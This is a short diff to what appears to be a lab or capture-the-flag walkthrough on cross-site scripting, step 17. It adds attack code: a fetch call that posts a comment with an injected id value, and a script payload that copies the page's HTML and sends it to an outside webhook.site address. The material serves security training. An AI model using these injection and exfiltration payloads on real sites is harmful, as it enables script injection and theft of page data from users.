@@ -151,16 +151,18 @@ TODO: <<//script><script>success()<<//script>
 Attack code:
 
 ```js
-// TODO: function send(payload) {
+// TODO: 
+function send(payload) {
     fetch('/comment', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify({text: 'http://google.com/', id: "1);success("})
+        body: JSON.stringify({text: 'http://localhost:4000/17', id: "1);success("})
     }).then((response) => response.clone().text())
     .then((data) => console.log(data));
 }
+send('<script> payload = document.documentElement.innerHTML; window.location="https://webhook.site/my-private-id?query=" + encodeURIComponent(payload); </script>')
 ```
 
 # 18. Congrats
